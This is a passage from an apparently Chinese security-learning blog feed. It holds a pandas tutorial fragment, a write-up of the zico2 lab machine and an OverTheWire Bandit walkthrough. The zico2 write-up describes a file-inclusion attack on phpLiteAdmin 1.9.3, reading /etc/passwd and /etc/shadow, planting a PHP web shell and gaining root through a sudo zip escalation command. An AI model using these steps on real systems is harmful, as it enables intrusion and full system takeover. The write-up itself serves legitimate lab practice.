DataFrame(data=dic,index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>])</span><br><span class="line">df</span><br><span class="line"><span class="comment">#输出结果为</span></span><br><span class="line">name salary</span><br><span class="line">——————————————————————</span><br><span class="line">a zhangsan <span class="number">1000</span></span><br><span class="line">b lisi <span class="number">2000</span></span><br><span class="line">c wanglaowu <span class="number">3000</span></span><br><span class="line"><span class="comment">#DataFrame的属性</span></span><br><span class="line">values、columns、index、shape</span><br><span class="line">df.values <span class="comment">#返回二维numpy数</span></span><br><span class="line">df.columns <span class="comment">#返回列索引</span></span><br><span class="line">df.index <span class="comment">#返回行索引</span></span><br><span class="line">df.shape <span class="comment">#返回形状</span></span><br><span class="line">df.dtype <span class="comment">#报错 因为DataFrame可以装不同类型的数据</span></span><br></pre></td></tr></table></figure><p>df的索引＆切片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">df = DataFrame(data=dic,index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>])</span><br><span class="line">df</span><br><span class="line"><span class="comment">#输出结果为</span></span><br><span class="line">name salary</span><br><span class="line">——————————————————————</span><br><span class="line">a zhangsan <span class="number">1000</span></span><br><span class="line">b lisi <span class="number">2000</span></span><br><span class="line">c wanglaowu <span class="number">3000</span></span><br><span class="line">df[<span class="string">&#x27;name&#x27;</span>] <span class="comment">#显示列时输入索引名即可</span></span><br><span class="line"><span class="comment">#输出结果为</span></span><br><span class="line">name</span><br><span class="line">—————————————</span><br><span class="line">a zhangsan</span><br><span class="line">b lisi</span><br><span class="line">c wanglaowu</span><br><span class="line">显示多列时加逗号与另一个引号</span><br><span class="line">df.loc[a]</span><br><span class="line">df.iloc[[a,b]] <span class="comment">#显示行 iloc指隐式索引 loc指显示索引</span></span><br><span class="line"><span class="comment">#输出结果为</span></span><br><span class="line">name salary</span><br><span class="line">——————————————————————</span><br><span class="line">a zhangsan <span class="number">1000</span></span><br><span class="line">b lisi <span class="number">2000</span></span><br><span class="line">df.iloc[a,b] <span class="comment">#显示第a行 第b列的单个元素</span></span><br><span class="line">切片</span><br><span class="line">df[<span class="number">0</span>:<span class="number">2</span>] <span class="comment">#切行</span></span><br><span class="line">df.iloc[:,<span class="number">0</span>:<span class="number">2</span>] <span class="comment">#切列</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zico2解析</title>
      <link href="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/"/>
      <url>/2024/03/28/zico2%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>攻击机：kali<br>靶机：zico2</p><h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><p>Poc Exp 和payload 的关系<br>dirb （网站目录扫描）<br>文件包含漏洞<br>mysql相关（虽然是图形化页面）<br>一句话木马+蚁剑<br>zip提权</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>先把俩机子开开<br>扫一下同网段设备<br><img src="1.jpg" alt="1"><br>看到靶机开放了 22 80 56444等端口<br>我们访问http服务 没发现什么 用dirb扫描看一下<br><img src="2.jpg" alt="2"><br>存在&#x2F;dbadmin&#x2F;目录 进入之后是个登陆页面 写着phpLiteAdmin v1.9.3<br><img src="3.jpg" alt="3"><br>那就用searchsploit来寻找可行的漏洞<br><img src="4.jpg" alt="4"><br>找到四个 我们用searchsploit -m 下载第三个漏洞文件到本地<br>下载后查看发现该文件中写着POC 也就是Proof of Concept 这是什么意思呢<br><img src="6.jpg" alt="6"></p><blockquote><p>POC和EXP</p><p>POC &#x3D; Proof of Concept中文意思是“观点证明”。这个短语并非仅仅在漏洞报告中使用，甲方在项目招标过程中也常常要求乙方提供POC，即证明你的方案或者产品能达到声称的功能或性能，漏洞报告中的POC则是一段说明或者一个攻击的样例，使得读者能够确认这个漏洞是真实存在的。</p><p>EXP &#x3D; Exploit的中文意思是“漏洞利用”。意思是一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码，可以使得读者完全了解漏洞的机理以及利用的方法。</p><p>如下视图所示：<br><img src="5.png" alt="5"></p><p>POC，是用来验证漏洞是否存在的一段代码。<br>EXP，指利用系统漏洞进行渗透。<br>先有POC，后有EXP。<br>Payload：中文为’有效载荷’，指成功EXP之后，真正在目标系统执行的代码或者指令<br>Shellcode：中文为’shell代码’，是Payload的一种，由于其建立正向&#x2F;反向shell而得名 （正向&#x2F;反向：主动&#x2F;被动链接）</p></blockquote><p>绕过这个页面一般用burpsuite爆破<br>输入密码admin我们成功进入了页面<br><img src="7.jpg" alt="7"><br>里边有一个没删的表 <code>info</code> 进去可以发现用户名root和zico与对应的密码md5加密 只要通过解密网站即可获取明文<br>主页面还有一个小按钮 按了之后发现连接中有文件包含漏洞<br><img src="8.jpg" alt="8"><br>我们使用验证文件包含漏洞的方式 在传参中输入若干的 <code>../</code>(返回上个目录)<br>然后输入<code>/etc/passwd</code> <code>/etc/shadow</code> 若正常显示内容则表示漏洞存在<br>前者显示所有账号信息 后者显示所有用户名和密码<br><img src="10.jpg" alt="10"><br>这里再回到之前调用的漏洞 其中说明了步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.创建一个database 名称为hack.php</span><br><span class="line">2.在其中创建一个名为123的表 插入数据&lt;?php phpinfo()?&gt; 类型为TEXT</span><br><span class="line">3.(使用文件包含漏洞即可)想办法运行hack.php</span><br></pre></td></tr></table></figure><p><img src="11.jpg" alt="11"><br>搞完之后放在文件包含漏洞里测试效果<br><img src="12.jpg" alt="12"><br>这个页面就ok了<br>然后就都想得到嘛 用一句话代码 通过蚁剑连接<br><img src="13.jpg" alt="13"><br>右键进入虚拟终端 在&#x2F;home&#x2F;zico&#x2F;wordpress中查看wp-config.php的内容<br>发现一套密码<br><img src="14.jpg" alt="14"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/\*\* MySQL database username \*/</span><br><span class="line">define(&#x27;DB\_USER&#x27;, &#x27;zico&#x27;);</span><br><span class="line">/\*\* MySQL database password \*/</span><br><span class="line">define(&#x27;DB\_PASSWORD&#x27;, &#x27;sWfCsfJSPV9H3AmQzw8&#x27;);</span><br></pre></td></tr></table></figure><p>账号为zico 密码为sWfCsfJSPV9H3AmQzw8<br>用这套密码和ssh登陆操作系统<br><img src="15.jpg" alt="15"><br>登陆成功 使用sudo -l查看拥有sudo权限的命令 进行zip提权即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zip 1.zip to\_do.txt -T --unzip-command=&quot;sh -c /bin/bash&quot;</span><br></pre></td></tr></table></figure><p><img src="16.jpg" alt="16"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一个集合了各方之长的靶机 流程很长<br>那我们下次再见！</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OverTheWire-bandit解析</title>
      <link href="/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/"/>
      <url>/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="友情提示"><a href="#友情提示" class="headerlink" title="友情提示"></a>友情提示</h1><p>理论来说 这个网页的网站说了不允许剧透或是writeup<br>但这大多是为了方便我自身复习留下的资料<br>因此我不会直接在文中提供flag 只会写出方法与代码</p><h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p><a href="https://overthewire.org/wargames/bandit/bandit0.html">网页链接</a><br>该网页类似一个在线靶场 需要你登录它所提供的账号密码登录其ssh服务进行一场小游戏<br>我使用了MobaXterm来登陆&#x2F;输入指令</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><h2 id="level-0-准备"><a href="#level-0-准备" class="headerlink" title="level 0&#x2F;准备"></a>level 0&#x2F;准备</h2><blockquote><p>The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.</p></blockquote><p>页面描述为指示你链接ssh服务 并给予了对应ip 端口 账号 密码<br>一旦登录成功 便可进入level0→level1的页面<br>关于登录 我们先打开MobaXterm 点击左上角的 <strong>Session</strong> 选择ssh<br>输入ip地址<code>bandit.labs.overthewire.org</code>与端口2220<br><img src="1.jpg" alt="1"><br>确认后左边的User sessions便会多出一个连接 右键 Edit session 会进入相同的页面<br><img src="2.jpg" alt="2"><br>先点击① 会出来账号管理器 点击②来新建一个 输入bandit0与bandit0<br>保存好后在登陆前勾选左边的 <code>Specify username</code> 选择对应账号名即可快速登陆<br>注：使用MobaXterm的该功能必须设定一个高级密码 请不要忽视它跳出的窗口<br>每道题里的flag相当于下一题的账号密码<br>也就是说下道题的结论是 账号 <strong>bandit(题号)</strong> 与 密码 <strong>flag值</strong><br>这些即为前提 接下来正式入手</p><h2 id="level1-起始"><a href="#level1-起始" class="headerlink" title="level1&#x2F;起始"></a>level1&#x2F;起始</h2><blockquote><h1 id="Bandit-Level-0-→-Level-1"><a href="#Bandit-Level-0-→-Level-1" class="headerlink" title="Bandit Level 0 → Level 1"></a>Bandit Level 0 → Level 1</h1><h2 id="Level-Goal"><a href="#Level-Goal" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file called <strong>readme</strong> located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.</p><h2 id="Commands-you-may-need-to-solve-this-level"><a href="#Commands-you-may-need-to-solve-this-level" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>根据题目描述 在主目录下有名为readme的文件 查看该文件内容即可获取密码<br>既然是在主目录下 其实连ls都省了 直接 <code>cat readme</code>即可获取flag值</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><blockquote><h1 id="Bandit-Level-1-→-Level-2"><a href="#Bandit-Level-1-→-Level-2" class="headerlink" title="Bandit Level 1 → Level 2"></a>Bandit Level 1 → Level 2</h1><h2 id="Level-Goal-1"><a href="#Level-Goal-1" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file called <strong>-</strong> located in the home directory</p><h2 id="Commands-you-may-need-to-solve-this-level-1"><a href="#Commands-you-may-need-to-solve-this-level-1" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>此关的目的是读取一个名为-的文件<br>由于-的名称与root根目录相同 直接cat或者加引号都无法读取<br>因此需要转为绝对路径<code>./-</code><br>输入<code>cat ./-</code>来获取flag值</p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><blockquote><h1 id="Bandit-Level-2-→-Level-3"><a href="#Bandit-Level-2-→-Level-3" class="headerlink" title="Bandit Level 2 → Level 3"></a>Bandit Level 2 → Level 3</h1><h2 id="Level-Goal-2"><a href="#Level-Goal-2" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file called <strong>spaces in this filename</strong> located in the home directory</p><h2 id="Commands-you-may-need-to-solve-this-level-2"><a href="#Commands-you-may-need-to-solve-this-level-2" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>这关是考察通过cat获取文件名中有空格的文件内容<br>用引号来转义空格 使系统识别后部分为一个整体即可<br><code>cat ‘spaces in this filename’</code></p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><blockquote><h1 id="Bandit-Level-3-→-Level-4"><a href="#Bandit-Level-3-→-Level-4" class="headerlink" title="Bandit Level 3 → Level 4"></a>Bandit Level 3 → Level 4</h1><h2 id="Level-Goal-3"><a href="#Level-Goal-3" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a hidden file in the <strong>inhere</strong> directory.</p><h2 id="Commands-you-may-need-to-solve-this-level-3"><a href="#Commands-you-may-need-to-solve-this-level-3" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>题目描述有一个被隐藏的文件藏在了inhere目录中 叫我们尝试读取<br>那就使用ls的-a附加项来查看隐藏文件<br>使用cd来切换目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd inhere //切换至inhere目录</span><br><span class="line">ls -al //列出所有文件 显示隐藏文件并显示详细信息</span><br><span class="line">cat .hidden //查看文件内容</span><br></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><blockquote><h1 id="Bandit-Level-4-→-Level-5"><a href="#Bandit-Level-4-→-Level-5" class="headerlink" title="Bandit Level 4 → Level 5"></a>Bandit Level 4 → Level 5</h1><h2 id="Level-Goal-4"><a href="#Level-Goal-4" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the only human-readable file in the <strong>inhere</strong> directory. Tip: if your terminal is messed up, try the “reset” command.</p><h2 id="Commands-you-may-need-to-solve-this-level-4"><a href="#Commands-you-may-need-to-solve-this-level-4" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>inhere目录中唯一可读的文件才是我们追求的答案<br>我们查看下边提示中的命令列表 发现了file命令可用<br>经过搜索得知 Linux file命令用于辨识文件类型<br>注：文件名前加了- 无法正常读取 需要使用相对路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">file ./\* //显示同个目录下的所有文件的文件类型</span><br><span class="line">观察结果：</span><br><span class="line">./\*</span><br><span class="line">./-file00: data</span><br><span class="line">./-file01: data</span><br><span class="line">./-file02: data</span><br><span class="line">./-file03: data</span><br><span class="line">./-file04: data</span><br><span class="line">./-file05: data</span><br><span class="line">./-file06: data</span><br><span class="line">./-file07: ASCII text</span><br><span class="line">./-file08: data</span><br><span class="line">./-file09: data</span><br></pre></td></tr></table></figure><p>很明显 只有-file07为ASII text形式 只需读取即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./-file07</span><br></pre></td></tr></table></figure><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><blockquote><h1 id="Bandit-Level-5-→-Level-6"><a href="#Bandit-Level-5-→-Level-6" class="headerlink" title="Bandit Level 5 → Level 6"></a>Bandit Level 5 → Level 6</h1><h2 id="Level-Goal-5"><a href="#Level-Goal-5" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file somewhere under the <strong>inhere</strong> directory and has all of the following properties:</p><ul><li>human-readable</li><li>1033 bytes in size</li><li>not executable</li></ul></blockquote><p>inhere目录中的指定文件存有flag 以下为flag文件的特征：<br>可读性 大小1033字节 无法运行<br>这里我们使用find命令的附加项即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find [路径] [匹配条件] [动作]</span><br><span class="line">-name pattern：按文件名查找，支持使用通配符 \* 和 ?。</span><br><span class="line">-type type：按文件类型查找，可以是 f（普通文件）、d（目录）、l（符号链接）等。</span><br><span class="line">-size [+-]size[cwbkMG]：按文件大小查找，支持使用 + 或 - 表示大于或小于指定大小，单位可以是 c（字节）、w（字数）、b（块数）、k（KB）、M（MB）或 G（GB）。</span><br><span class="line">-mtime days：按修改时间查找，支持使用 + 或 - 表示在指定天数前或后，days 是一个整数表示天数。</span><br><span class="line">-user username：按文件所有者查找。</span><br><span class="line">-group groupname：按文件所属组查找。</span><br></pre></td></tr></table></figure><p>进入inhere目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br><span class="line">total 88</span><br><span class="line">drwxr-x--- 22 root bandit5 4096 Oct 5 06:19 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Oct 5 06:19 ..</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere00</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere01</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere02</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere03</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere04</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere05</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere06</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere07</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere08</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere09</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere10</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere11</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere12</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere13</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere14</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere15</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere16</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere17</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere18</span><br><span class="line">drwxr-x--- 2 root bandit5 4096 Oct 5 06:19 maybehere19</span><br></pre></td></tr></table></figure><p>结果如下 我们使用find命令寻找目标文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find -size 1033c //在当前目录寻找大小为1033字节的文件</span><br><span class="line">./maybehere07/.file2</span><br><span class="line">cat ./maybehere07/.file2 //查看内容</span><br></pre></td></tr></table></figure><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><blockquote><h1 id="Bandit-Level-6-→-Level-7"><a href="#Bandit-Level-6-→-Level-7" class="headerlink" title="Bandit Level 6 → Level 7"></a>Bandit Level 6 → Level 7</h1><h2 id="Level-Goal-6"><a href="#Level-Goal-6" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored <strong>somewhere on the server</strong> and has all of the following properties:</p><ul><li>owned by user bandit7</li><li>owned by group bandit6</li><li>33 bytes in size</li></ul></blockquote><p>这次直接没有指定目录了<br>给的目标文件特征为：<br><strong>文件所属者bandit7</strong><br><strong>文件所属组bandit6</strong><br><strong>大小33字节</strong><br>刚刚也给了相关的附加项 这里直接进行搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -user bandit7 -group bandit6 -size 33c</span><br><span class="line">//以整个电脑范围寻找文件所属者为bandit7 文件所属组为bandit6 大小为33字节的文件</span><br><span class="line">/var/lib/dpkg/info/bandit7.password</span><br><span class="line">cat /var/lib/dpkg/info/bandit7.password //查看文件</span><br></pre></td></tr></table></figure><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><blockquote><h1 id="Bandit-Level-7-→-Level-8"><a href="#Bandit-Level-7-→-Level-8" class="headerlink" title="Bandit Level 7 → Level 8"></a>Bandit Level 7 → Level 8</h1><h2 id="Level-Goal-7"><a href="#Level-Goal-7" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong> next to the word <strong>millionth</strong></p><h2 id="Commands-you-may-need-to-solve-this-level-5"><a href="#Commands-you-may-need-to-solve-this-level-5" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/man.1.html">man</a>, grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd<br>密码在data.txt之中 字符串靠近millionth<br>我们这里使用uniq命令来寻找data.txt中没有重复的行列</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uniq data.txt|grep millionth</span><br><span class="line">//删除data.txt中的重复行 并筛选出有millionth的那行</span><br></pre></td></tr></table></figure><p>密码直接就出来了</p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><blockquote><h1 id="Bandit-Level-8-→-Level-9"><a href="#Bandit-Level-8-→-Level-9" class="headerlink" title="Bandit Level 8 → Level 9"></a>Bandit Level 8 → Level 9</h1><h2 id="Level-Goal-8"><a href="#Level-Goal-8" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong> and is the only line of text that occurs only once</p><h2 id="Commands-you-may-need-to-solve-this-level-6"><a href="#Commands-you-may-need-to-solve-this-level-6" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p></blockquote><p>和上题相似 但要找的是只出现过一次的内容<br>需要使用与uniq相似的sort命令来一起助力<br>同时使用uniq的附加项-u来显示仅显示出一次的行列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort data.txt|uniq -u</span><br></pre></td></tr></table></figure><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><blockquote><h1 id="Bandit-Level-9-→-Level-10"><a href="#Bandit-Level-9-→-Level-10" class="headerlink" title="Bandit Level 9 → Level 10"></a>Bandit Level 9 → Level 10</h1><h2 id="Level-Goal-9"><a href="#Level-Goal-9" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong> in one of the few human-readable strings, preceded by several ‘&#x3D;’ characters.</p><h2 id="Commands-you-may-need-to-solve-this-level-7"><a href="#Commands-you-may-need-to-solve-this-level-7" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p></blockquote><p>这题要用到strings命令输出文件中可打印的字符 并筛选出与等号相接的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings data.txt|grep =</span><br></pre></td></tr></table></figure><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><blockquote><h1 id="Bandit-Level-10-→-Level-11"><a href="#Bandit-Level-10-→-Level-11" class="headerlink" title="Bandit Level 10 → Level 11"></a>Bandit Level 10 → Level 11</h1><h2 id="Level-Goal-10"><a href="#Level-Goal-10" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong>, which contains base64 encoded data</p><h2 id="Commands-you-may-need-to-solve-this-level-8"><a href="#Commands-you-may-need-to-solve-this-level-8" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p></blockquote><p>data.txt中的密码经过base64加密 解密即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -d data.txt</span><br></pre></td></tr></table></figure><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><blockquote><h1 id="Bandit-Level-11-→-Level-12"><a href="#Bandit-Level-11-→-Level-12" class="headerlink" title="Bandit Level 11 → Level 12"></a>Bandit Level 11 → Level 12</h1><h2 id="Level-Goal-11"><a href="#Level-Goal-11" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong>, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions</p><h2 id="Commands-you-may-need-to-solve-this-level-9"><a href="#Commands-you-may-need-to-solve-this-level-9" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p></blockquote><p>该密码经过凯撒密码(偏移量13)加密 放在网站里解密即可<br><img src="4.jpg" alt="4"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF实战相关2</title>
      <link href="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/"/>
      <url>/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/</url>
      
